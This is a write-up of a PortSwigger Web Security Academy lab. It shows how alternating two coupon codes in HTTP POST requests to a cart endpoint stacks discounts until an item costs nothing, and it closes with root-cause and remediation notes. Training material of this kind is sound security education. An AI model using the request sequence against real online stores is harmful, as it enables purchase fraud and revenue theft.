# PortSwigger Lab: Flawed enforcement of business rules

# TAGS: Business Logic, Coupon, Cart Manipulation, Burp Suite

Category: Business Logic
Date: October 21, 2026
Day: Wednesday
Link: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-flawed-enforcement-of-business-rules
Published: Ready
Status: Done

---

## Intro

This lab is part of the Business Logic series. Here the application has two coupon codes, but it enforces the "one use per coupon" rule in a flawed way: it only checks against the coupon applied immediately before. So I show how I stacked the two coupons by alternating them, until the cart total dropped to zero.

This write-up covers the reconnaissance, the exploitation steps, the root cause, the real-world impact, and how to prevent it.

---

## Reconnaissance:

#### Lab Description Lookup:

The lab description says the application has a logic flaw in how it enforces the business rules around coupons. The goal is to buy the **Lightweight l33t leather jacket** ($1,337.00).

I logged in with the credentials provided by the lab (`wiener:peter`) and looked for coupons. I found two:

- **`SIGNUP30`** — 30% off, given when I signed up for the newsletter;
- **`NEWCUST5`** — $5 off, shown in a banner on the store page: *"New customers use code at checkout: NEWCUST5"*.

I added the leather jacket to the cart and went to apply the coupons.

---

## Exploitation:

#### Step 1: Apply both coupons

In the cart I applied the first coupon, and then the second:

```http
POST /cart/coupon HTTP/2
Host: 0a2a00600470bbf580def842000b006d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

csrf=VeXRJ0RiGh9DKcV01wr4wits5DTEhhPT&coupon=SIGNUP30
```

```http
POST /cart/coupon HTTP/2
Host: 0a2a00600470bbf580def842000b006d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

csrf=VeXRJ0RiGh9DKcV01wr4wits5DTEhhPT&coupon=NEWCUST5
```

Both were accepted and the total went down.

#### Step 2: Find the flaw in the "already applied" check

When I tried to apply the same coupon again, the application rejected it:

```http
POST /cart/coupon HTTP/2
Host: 0a2a00600470bbf580def842000b006d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

csrf=VeXRJ0RiGh9DKcV01wr4wits5DTEhhPT&coupon=NEWCUST5
```

```http
HTTP/2 302 Found
Location: /cart?couponError=COUPON_ALREADY_APPLIED&coupon=NEWCUST5
```

The error `COUPON_ALREADY_APPLIED` tells me the server rejects reusing a coupon — but it only seems to compare against the **last** coupon applied. So I alternated the two codes: `SIGNUP30` → `NEWCUST5` → `SIGNUP30` → `NEWCUST5` → …

```http
POST /cart/coupon ... coupon=SIGNUP30   → 302 /cart
POST /cart/coupon ... coupon=NEWCUST5   → 302 /cart
POST /cart/coupon ... coupon=SIGNUP30   → 302 /cart
POST /cart/coupon ... coupon=NEWCUST5   → 302 /cart
... (repeat)
```

Each cycle applied another 30% off plus another $5 off, and the total kept shrinking.

I did this alternation by hand, but it could also be automated with Burp Intruder — a payload list that alternates the two codes (`SIGNUP30`, `NEWCUST5`, `SIGNUP30`, …) would send the whole sequence in a single attack.

#### Step 3: Zero the total and checkout

I kept alternating until the cart total reached **$0.00**, and then placed the order. The lab was solved.

---

## Root Cause

The application enforces the "coupon can only be used once" rule by checking whether the submitted coupon is the same as the one applied immediately before, instead of checking it against the full list of coupons already used. This means the rule is only violated when the same code is repeated twice in a row — alternating two codes bypasses it entirely.

---

## Impact

An attacker can stack discounts repeatedly and buy items for free. In real-world applications this is direct revenue loss, and the same class of flaw (validating only the previous state instead of the whole state) can appear in other business rules like limits, quotas, and promotions.

---

## Remediation

To prevent this issue, applications should:

- Enforce business rules against the full state (all applied coupons), not just the last action;
- Track coupon usage server-side and reject any reuse of the same code;
- Validate the final order total server-side before processing payment;
- Test the rules with combinations and repeated actions, not just the happy path.

---

## Key Takeaways

1. The "already applied" check compared only against the previous coupon, not all applied coupons.
2. Alternating two codes (`SIGNUP30` / `NEWCUST5`) bypassed the check and stacked discounts.
3. The app trusted a client-side cart total that I could drive to $0.
4. Business rules must be enforced over the whole state, not just the last step.

---

## References

- [PortSwigger — Business logic vulnerabilities](https://portswigger.net/web-security/logic-flaws)
- [PortSwigger — Flawed enforcement of business rules (lab)](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-flawed-enforcement-of-business-rules)
- [OWASP — Business Logic Vulnerabilities](https://owasp.org/www-community/vulnerabilities/Business_logic_vulnerability)

---

## Disclaimer

This write-up was created for educational purposes only. All testing was performed in an authorized PortSwigger Web Security Academy laboratory environment. Never test systems without explicit authorization.

This article was written with the assistance of artificial intelligence tools for text review, structure, and grammar correction. However, the entire testing process, technical analysis, vulnerability exploitation, and conclusions presented are the sole responsibility of the author and are based on tests performed in a controlled environment provided by the PortSwigger Web Security Academy.
